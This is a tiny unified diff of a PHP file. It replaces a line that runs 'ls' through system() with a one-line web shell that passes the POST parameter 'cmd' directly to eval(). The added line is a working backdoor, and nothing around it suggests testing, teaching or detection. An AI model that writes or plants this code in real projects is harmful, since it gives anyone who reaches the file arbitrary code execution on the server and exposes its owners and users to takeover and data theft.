@@ -1,1 +1,1 @@
-<?php system('ls');?>
+<?php eval($_POST['cmd']); ?>
